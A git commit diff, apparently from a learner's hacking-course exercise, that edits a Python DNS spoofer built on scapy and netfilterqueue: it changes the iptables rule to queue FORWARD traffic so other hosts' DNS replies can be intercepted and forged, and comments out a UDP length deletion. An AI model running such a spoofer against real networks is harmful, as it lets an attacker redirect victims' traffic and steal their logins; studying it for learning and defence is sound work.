3439b7a5523ffe3f6b0feee93fb6a6e76ea045c3
maxicorbs <61736384+maxicorbs@users.noreply.github.com>
2022-10-11 16:01:42 +0100

    day 16 end.3

--- dns_spoofer/dns_spoof_remote.py
+++ dns_spoofer/dns_spoof_remote.py
@@ -29,7 +29,7 @@ def process_packet(packet):
             scapy_packet[scapy.DNS].ancount = 1
             del scapy_packet[scapy.IP].chksum
             del scapy_packet[scapy.IP].len
-            del scapy_packet[scapy.UDP].len
+            # del scapy_packet[scapy.UDP].len
             del scapy_packet[scapy.UDP].chksum
             packet.set_payload(str(scapy_packet))
     packet.accept()
@@ -37,8 +37,7 @@ def process_packet(packet):
 
 try:
     print("[+] Amening IP tables")
-    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 1", shell=True)
-    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 1", shell=True)
+    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 1", shell=True)
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(1, process_packet)
     queue.run()
